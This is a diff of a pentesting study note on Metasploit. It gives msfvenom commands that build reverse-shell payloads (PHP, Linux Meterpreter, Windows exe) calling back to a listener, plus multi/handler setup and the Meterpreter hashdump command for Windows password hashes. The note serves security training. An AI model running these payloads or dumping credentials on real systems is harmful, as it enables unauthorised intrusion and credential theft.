@@ -56,25 +56,45 @@ Refers to commands used after selecting a specific module. For example, you can 
 
 # MSFvenom
 ## Description
-MSFvenom is where a pentester can access all the payloads available within Metasploit and create new payloads in different formats and operating systems.
+MSFvenom is where a pentester can access all the payloads available within Metasploit and create new payloads in different formats (e.g., `.exe`, `.aspx`, `.war`, `.py`) and operating systems.
 - Allows the pentester the ability to upload raw files for exploitation
+
+**Payload Naming Conventions:** `<OS>/<arch>/<payload>`
+- `<OS>` - indicates the operating system (Linux, Windows, etc.)
+- `<arch>` - indicates the architecture (x86, x64, etc)
+- `<payload>` - indicates the payload type (singles or stagers)
+	- Singles are indicated with underscores `_` ; `shell_reverse_tcp`
+	- Staged are indicated with a slash `/` ; `shell/reverse_tcp`
+- Examples:
+	- `linux/x86/meterpreter_reverse_tcp` - single Linux 32bit reverse tcp payload
+	- `windows/x64/meterpreter/reverse_tcp` - staged Windows 64bit reverse tcp payload
+
 
 **Example of using MSFvenom to achieve a reverse shell is as follows:**
 1) Generate a reverse shell script using MSFvenon in a specified file format
-	- Reference "*Generating a reverse shell*" under examples
+	- Example: `msfvenom -p linux/x64/meterpreter/reverse_tcp -f php -o shell.php LHOST=10.10.10.5 LPORT=443`
 2) Deliver/install shell script onto the target machine
 3) Start the Metasploit multi-handler to listen for reverse shell callbacks "catching a shell."
 	- `msf6 > use exploit/multi/handler`
-4) Execute the reverse shell on the target machine. After execution, your *handler* should catch the connection and allow the pentester access to the machine.
+	- **Note:** don't forget to set payload, LHOST and LPORT under options `options`
+		-   `set PAYLOAD <payload>`
+		-   `set LHOST <listen-address>`
+		-   `set LPORT <listen-port>`
+1) Execute the reverse shell on the target machine (`exploit`). After execution, your *handler* should catch the connection and allow the pentester access to the machine.
 
 **Note:** payloads are created with comments that will prevent the payload from running unless removed. Therefore, make sure to open the payload and remove comments from the beginning and end of the file before using it.
 
 ## Commands
- - `-l, --list [type]` - List all modules for payloads, encoders, nops, platforms, archs, encrypt, formats, and all
- - `-p, --payload [payload]` - Payload to use
+ - `-l <type>` - list all modules for payloads, encoders, nops, platforms, archs, encrypt, formats, and all
+ - `-p <payload> <options>` - specifies payload to use
+### Options
+ - `-f <format>` - specifies output file format
+ - `-o <file name>` - specifies output file name
+ - `LHOST=<ip>` - specifies the IP address of the listening host (should be the IP of the machine you are using for your pentest)
+ - `LPORT=<port>` - sets the local port used to catch reverse shell connection
 
 ## Examples
-- **Generating a reverse shell:**
+- **Generating a PHP reverse shell:**
 	- `msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=1234 -f raw > reverse_shell.php`
 		- `msfvenom` - specify that you are using MSFvenom
 		- `-p php/reverse_php` - specifies to use payload "php/reverse_php"
@@ -82,10 +102,19 @@ MSFvenom is where a pentester can access all the payloads available within Metas
 		- `LPORT=1234` - sets local port used to catch reverse shell connection
 		- `> reverse_shell.php` - specifies output filename
 
+- **Generating a Windows x64 Reverse Shell in an exe format:**
+	- `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<ip> LPORT=<port>`
+		-  `msfvenom` - specify that you are using MSFvenom
+		- `-p windows/x64/shell/reverse_tcp` - specifies to use payload "windows/x64/shell/reverse_tcp"
+		- `-f exe` - specifies *EXE* output file format
+		- `-o shell.exe` - specifies output file name *"shell.exe"*
+		- `LHOST=<ip>` - sets the local IP address (should be the IP of the machine you are using for your pentest)
+		- `LPORT=<port>` - sets the local port used to catch reverse shell connection
+
 # Meterpreter
 ## Description
 Meterpreter is a tool that runs within the target system's memory, acting as a command and control agent communicating with the attacked computer through encrypted communications. Meterpreter provides post-exploitation tools used to escalate privileges and move laterally. Additionally, you can use Meterpreter commands to interact more easily with the target operating system and files.
-- **Note:** most antivirus software will detect meterpreter and is not a stealth tool.
+- **Note:** most antivirus software will detect Meterpreter and is not a stealth tool.
 
 Determining which Meterpreter payload to use can be decided using three factors:
 1) Target operating system (OSX, Linux, Windows, iOS, Android, etc.)
@@ -102,7 +131,7 @@ Determining which Meterpreter payload to use can be decided using three factors:
 - Move laterally to another machine on the network
 
 ### Steps for using post-exploitation tools
-1) Background your current meterpreter session `ctrl + Z` to use other modules
+1) Background your current Meterpreter session `ctrl + Z` to use other modules
 2) Check your currents sessions from msfconsole using `sessions` cmd
 	 - In the future, we can go back to this session using `sessions -i #`.
 3) Use the `back` cmd to exit the current module and load a post-exploitation module
@@ -114,7 +143,7 @@ Determining which Meterpreter payload to use can be decided using three factors:
 Meterpreter commands will be different for each version. To get a list of available commands, type `help`
 - `hashdump` - Dumps the database contents where users' passwords are stored on Windows OS.
 	- The SAM (Security Account Manager) database stores users' passwords on Windows systems.
-	- Passwords are stored in the NTLM (New Technology LAN Manager) format.
+	- Passwords are stored in NTLM (New Technology LAN Manager) format.
 - `search` - Use to locate specific files within a system
 	- Example: `search -f flag.txt`
 - `ctrl + Z` - Opens background session to return to msfconsole
